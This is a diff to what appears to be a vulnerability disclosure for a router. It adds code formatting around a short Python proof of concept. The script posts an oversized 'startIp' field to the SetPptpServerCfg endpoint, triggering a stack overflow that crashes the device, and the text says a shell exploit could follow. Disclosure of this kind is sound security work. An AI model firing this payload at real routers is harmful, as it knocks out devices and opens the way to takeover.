@@ -12,10 +12,13 @@ and put into the v19 without size checking, resulting in a stack overflow.
    ![My Image](9.png)
 
 ## 3 POC
-
+```python
 import requests
+
 url = 'http://IP:port/goform/SetPptpServerCfg'
+
 headers = {"Cookie": "password=You cookie"}
+
 data = {
     'serverEn': 2,
     'startIp': 'l' * 10000
@@ -23,4 +26,5 @@ data = {
 r = requests.post(url=url, headers=headers, data=data)
 res = r.text
 print(res)
+```
 You can observe the router crashing, and ultimately, it is possible to craft an exploit to gain a shell.
